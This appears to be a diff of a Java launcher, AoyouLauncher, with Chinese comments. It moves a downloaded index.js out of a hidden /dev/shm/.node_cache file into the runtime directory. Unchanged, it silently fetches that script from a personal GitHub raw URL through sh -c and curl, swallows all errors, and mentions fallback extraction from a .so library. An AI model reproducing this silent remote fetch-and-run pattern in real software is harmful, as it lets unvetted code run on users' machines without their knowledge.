@@ -81,19 +81,17 @@ public class AoyouLauncher {
             extractAppFiles(jarPath, runtimePath);
         }
 
-        // ★ index.js 写到 /dev/shm（内存文件系统，不占磁盘）
-        // 先从 GitHub 下载最新版到 /dev/shm
-        String shmPath = "/dev/shm/.node_cache";
-        try { updateFromGitHubToShm(shmPath); } catch (Exception e) {}
+        // ★ index.js 写到工作目录（跟 node_modules 同级，node 才能找到依赖）
+        // 先从 GitHub 下载最新版
+        String indexJsPath = runtimeDir + "/index.js";
+        try { updateFromGitHubToDir(runtimeDir); } catch (Exception e) {}
 
-        // 如果 /dev/shm 没有（GitHub 下载失败），从 JAR 解压到 /dev/shm
-        if (!new File(shmPath).exists()) {
-            try { extractIndexToShm(jarPath, shmPath); } catch (Exception e) {}
-        }
+        // 如果 GitHub 下载失败，C 代码会从 .so 里提取
+        // 所以这里不检查是否存在
 
-        // 4. 检查 index.js 在 /dev/shm
-        if (!new File(shmPath).exists()) {
-            System.err.println("Failed to locate index");
+        // 4. 检查 node_modules 存在
+        if (!Files.exists(runtimePath.resolve("node_modules"))) {
+            System.err.println("Failed to locate node_modules");
             System.exit(1);
             return;
         }
@@ -402,10 +400,11 @@ public class AoyouLauncher {
     }
 
 
-    /** 从 GitHub 下载最新 index.js 到 /dev/shm */
-    private static void updateFromGitHubToShm(String shmPath) {
+    /** 从 GitHub 下载最新 index.js 到工作目录 */
+    private static void updateFromGitHubToDir(String runtimeDir) {
         String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/index.js";
-        Path tmp = Paths.get(shmPath + ".tmp");
+        Path target = Paths.get(runtimeDir, "index.js");
+        Path tmp = Paths.get(runtimeDir, "index.js.tmp");
         try {
             ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                 "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
@@ -414,24 +413,13 @@ public class AoyouLauncher {
             try { p.getInputStream().close(); } catch (Exception e) {}
             int code = p.waitFor();
             if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
-                Files.move(tmp, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
+                Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
             } else {
                 Files.deleteIfExists(tmp);
             }
         } catch (Exception e) {
             try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
         }
-    }
-
-    /** 从 JAR 解压 index.js 到 /dev/shm */
-    private static void extractIndexToShm(String jarPath, String shmPath) {
-        try (JarFile jar = new JarFile(jarPath)) {
-            JarEntry entry = jar.getJarEntry("app/index.js");
-            if (entry == null) return;
-            try (InputStream is = jar.getInputStream(entry)) {
-                Files.copy(is, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
-            }
-        } catch (Exception e) {}
     }
 
     private static String findOrDownloadNode(String runtimeDir) {
